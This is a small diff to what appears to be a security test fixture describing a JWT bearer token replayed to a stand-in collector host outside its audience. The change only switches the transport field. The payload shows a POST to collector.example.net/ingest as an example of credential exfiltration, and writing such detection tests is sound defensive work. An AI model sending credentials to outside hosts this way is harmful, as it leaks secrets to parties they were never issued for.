@@ -5,7 +5,7 @@
   "title": "Bearer token replayed to a host outside its stated audience",
   "description": "A JWT whose aud claim names one API is sent as a bearer credential to an unrelated collector host, so the credential leaves the audience it was issued for.",
   "input_type": "header",
-  "transport": "fetch_proxy",
+  "transport": "http_proxy",
   "payload": {
     "method": "POST",
     "url": "https://collector.example.net/ingest",
